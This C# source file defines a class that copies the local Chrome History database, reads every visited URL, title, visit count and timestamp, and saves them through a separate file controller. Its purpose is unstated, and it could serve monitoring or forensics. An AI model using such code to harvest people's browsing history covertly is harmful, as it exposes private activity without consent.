using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.Data.Sql;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SnS.Functions;

namespace SnS.Classes
{

    static class GoogleChrome
    {
        public static List<HistoryItem> allHistoryItems;

        private static List<HistoryItem> allShownHistoryItems = new List<HistoryItem>();
        

        public static void getHistory()
	    {

            string chromeHistoryFile = String.Empty;

            chromeHistoryFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History";
            string duplicate = GlobalVariables.rootFolder + "History";
            //FILE COPY
            FileController.setFilePermission(duplicate);
            try { System.IO.File.Copy(chromeHistoryFile, duplicate, true); }
            catch(Exception e){}

            //Console.WriteLine(chromeHistoryFile);
            if (File.Exists(duplicate))
            {
                using (SQLiteConnection connection = new SQLiteConnection("Data Source=" + duplicate))
                {
                    connection.Open();

                    DataSet dataset = new DataSet();

                    SQLiteDataAdapter adapter = new SQLiteDataAdapter("select * from urls order by last_visit_time desc", connection);
                    adapter.Fill(dataset);

                    if (dataset != null && dataset.Tables.Count > 0 & dataset.Tables[0] != null)
                    {
                        DataTable dt = dataset.Tables[0];

                        allHistoryItems = new List<HistoryItem>();
                        

                        foreach (DataRow historyRow in dt.Rows)
                        {
                            HistoryItem historyItem = new HistoryItem()
                            {
                                URL = Convert.ToString(historyRow["url"]),
                                Title = Convert.ToString(historyRow["title"]),
                                Count = Convert.ToInt32(historyRow["visit_count"])
                            };

                            long utcMicroSeconds = Convert.ToInt64(historyRow["last_visit_time"]);

                            DateTime gmtTime = DateTime.FromFileTimeUtc(10 * utcMicroSeconds);

                            DateTime localTime = TimeZoneInfo.ConvertTimeFromUtc(gmtTime, TimeZoneInfo.Local);
                            historyItem.VisitedTime = localTime;

                            if (checkItem(historyItem) == true)
                            {
                                allHistoryItems.Add(historyItem);
                            }
                        }
                    }
                    //allShownHistoryItems = new List<HistoryItem>();
                    copyLastHistoryItems();
                    connection.Close();
                }
            }

            if(allHistoryItems != null && allHistoryItems.Count > 0)
            {
                //showHistory();
                FileController.saveHistory();
            }
	    }

        private static void copyLastHistoryItems()
        {
            for (int i = 0; i < allHistoryItems.Count; i++)
            {
                allShownHistoryItems.Add(allHistoryItems.ElementAt(i));
            }
        }

        private static bool checkItem(HistoryItem hi)
        {
            //if (allShownHistoryItems.Count == 0) return true;
            for (int i = 0; i < allShownHistoryItems.Count; i++)
            {
                if (allShownHistoryItems.ElementAt(i).URL == hi.URL &&
                    allShownHistoryItems.ElementAt(i).Title == hi.Title)
                {
                    return false;
                }
            }
            return true;
        }

        public static int GetNthIndex(string s, char t, int n)
        {
            int count = 0;
            for (int i = 0; i < s.Length; i++)
            {
                if (s[i] == t)
                {
                    count++;
                    if (count == n)
                    {
                        return i;
                    }
                }
            }
            return -1;
        }
    }
}
